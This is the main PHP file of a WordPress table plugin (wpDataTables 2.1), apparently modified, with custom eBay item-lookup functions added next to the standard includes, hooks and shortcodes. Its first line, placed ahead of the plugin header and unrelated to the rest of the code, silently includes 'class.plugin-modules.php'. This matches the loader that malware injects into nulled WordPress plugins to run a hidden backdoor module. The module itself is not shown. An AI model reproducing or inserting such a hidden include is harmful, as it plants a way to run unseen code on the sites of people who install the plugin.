

<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * @package wpDataTables
 * @version 2.1
 */
/*
Plugin Name: wpDataTables
Plugin URI: http://tms-plugins.com
Description: Add interactive tables easily from any input source
//[<-- Full version -->]//
Version: 2.1
//[<--/ Full version -->]//
//[<-- Full version insertion #27 -->]//
Author: TMS-Plugins
Author URI: http://tms-plugins.com
Text Domain: wpdatatables
Domain Path: /languages
*/
?>
<?php

defined('ABSPATH') or die('Access denied');

/******************************
 * Includes and configuration *
 ******************************/

define('WDT_ROOT_PATH', plugin_dir_path(__FILE__)); // full path to the wpDataTables root directory
define('WDT_ROOT_URL', plugin_dir_url(__FILE__)); // URL of wpDataTables plugin

// Config file
require_once(WDT_ROOT_PATH . '/config/config.inc.php');

//[<-- Full version -->]//
// AJAX actions handlers
require_once(WDT_ROOT_PATH . 'controllers/wdt_ajax_actions.php');
//[<--/ Full version -->]//

// Plugin functions
require_once(WDT_ROOT_PATH . 'controllers/wdt_functions.php');

function wpdatatables_load() {
    if (is_admin()) {
        // Admin panel controller
        require_once(WDT_ROOT_PATH . 'controllers/wdt_admin.php');
        // Admin panel AJAX actions
        require_once(WDT_ROOT_PATH . 'controllers/wdt_admin_ajax_actions.php');
        //[<-- Full version -->]//
        // Table constructor
        //require_once(ABSPATH . 'wp-content/plugins/wpdatatables/wpimporter/api/ebay/WPEAE_EbayLoader.php');
        require_once(WDT_ROOT_PATH . 'source/class.constructor.php');
        //[<--/ Full version -->]//
    }

    require_once(WDT_ROOT_PATH . 'source/class.wdttools.php');
    require_once(WDT_ROOT_PATH . 'source/class.wdtconfigcontroller.php');
    require_once(WDT_ROOT_PATH . 'source/class.wdtsettingscontroller.php');
    require_once(WDT_ROOT_PATH . 'source/class.wdtexception.php');
    require_once(WDT_ROOT_PATH . 'source/class.sql.php');
    require_once(WDT_ROOT_PATH . 'source/class.wpdatatable.php');
    require_once(WDT_ROOT_PATH . 'source/class.wpdatacolumn.php');
    //[<-- Full version -->]//
    require_once(WDT_ROOT_PATH . 'source/class.wpexceldatatable.php');
    require_once(WDT_ROOT_PATH . 'source/class.wpexcelcolumn.php');
    require_once(WDT_ROOT_PATH . 'source/class.filterwidget.php');
    require_once(WDT_ROOT_PATH . 'source/class.wpdatachart.php');
    //[<--/ Full version -->]//
    require_once(WDT_ROOT_PATH . 'source/class.wdtbrowsetable.php');
    require_once(WDT_ROOT_PATH . 'source/class.wdtbrowsechartstable.php');
    require_once(WDT_ROOT_PATH . 'source/class.wdtbrowsechartstable.php');
    
    add_action('plugins_loaded', 'wdtLoadTextdomain');

    //[<--/ Full version -->]//
    //require_once(WDT_ROOT_PATH . 'wpimporter/api/ebay/WPDEAE_EbayLoader.php');
}

//add_action('init','getDataByItemId');
function getDataByItemId($itemId, $variations) {
    require_once(WDT_ROOT_PATH . 'wpimporter/include.php');

    $obj = new WPDEAE_EbayLoader();
    $goods = new WPDEAE_Goods(['external_id' => $itemId]);
    $detail = $obj->load_detail($goods);

    if( $detail['state'] == 'ok' ) {
        $item_info = $detail['goods'];
        $quantity  = 0;
        $price  = '';
        $ship_price  = '';
        $total = '';
        $seller = '';
        $availability = $item_info->availability;
        if($availability) {
            if (count($item_info->variations_meta) && $variations) {
                $split_variation = explode(',', $variations);
                $status = 'Not Item Found';
                foreach ($item_info->variations_meta as $var_meta ) {
                    $cond_count = 0;
                    foreach ($var_meta['list'] as $var_list ) {
                        foreach ($split_variation as $variation) {
                            if (strtolower($var_list['value']) == strtolower($variation)) {
                                $cond_count = $cond_count + 1;
                            }
                        }
                    }
                    if ($cond_count >= count($split_variation)) {
                        $quantity  = $var_meta['quantity'] - $var_meta['quantity_sold'];
                        $price  = $var_meta['price'];
                        $ship_price  = $item_info->additional_meta['ship'];
                        $total = $price + $ship_price;
                        $seller = $item_info->seller_id;
                        $status = 'active';
                        break;
                    }
                }
            } else {
                $quantity  = $item_info->additional_meta['quantity'];
                $price  = $item_info->price;
                $ship_price  = $item_info->additional_meta['ship'];
                $total = $price + $ship_price;
                $seller = $item_info->seller_id;
                $status = 'active';
            }
        } else {
            $status = 'Ended';
        }
        return ['estado'=> $status, 'quantity'=> $quantity, 'price'=>$price, 'delivery price'=> $ship_price, 'Total price'=>$total, 'seller'=> $seller];  
    }
    
    return ['estado'=>'Calculate','quantity'=>'0','price'=>'','delivery price'=>'','Total price'=>'','seller'=>''];  

}

//add_action('init','getDataByItemId');
function getDataByItemIdsAndVariations($items) {
    require_once(WDT_ROOT_PATH . 'wpimporter/include.php');

    $obj = new WPDEAE_EbayLoader();
    $details = $obj->load_details($items);

    return $details;

}

function parseDataByItemIdsAndVariations($table, $items) {
    require_once(WDT_ROOT_PATH . 'wpimporter/include.php');

    $obj = new WPDEAE_EbayLoader();
    $obj->parse_items($table, $items);
}
//[<-- Full version -->]//
// Globals for the shortcode variables
$wdtVar1 = '';
$wdtVar2 = '';
$wdtVar3 = '';


/*******************
 * Filtering widget *
 *******************/
function wdt_register_widget() {
    register_widget('wdtFilterWidget');
}

//[<--/ Full version -->]//

/********
 * Hooks *
 ********/
register_activation_hook(__FILE__, 'wdtActivation');
register_deactivation_hook(__FILE__, 'wdtDeactivation');
register_uninstall_hook(__FILE__, 'wdtUninstall');

add_shortcode('wpdatatable', 'wdtWpDataTableShortcodeHandler');
add_shortcode('wpdatachart', 'wdtWpDataChartShortcodeHandler');
add_shortcode('wpdatatable_sum', 'wdtFuncsShortcodeHandler');
add_shortcode('wpdatatable_avg', 'wdtFuncsShortcodeHandler');
add_shortcode('wpdatatable_min', 'wdtFuncsShortcodeHandler');
add_shortcode('wpdatatable_max', 'wdtFuncsShortcodeHandler');

//[<-- Full version -->]//
// Widget
add_action('widgets_init', 'wdt_register_widget');
//[<--/ Full version -->]//

wpdatatables_load();

?>
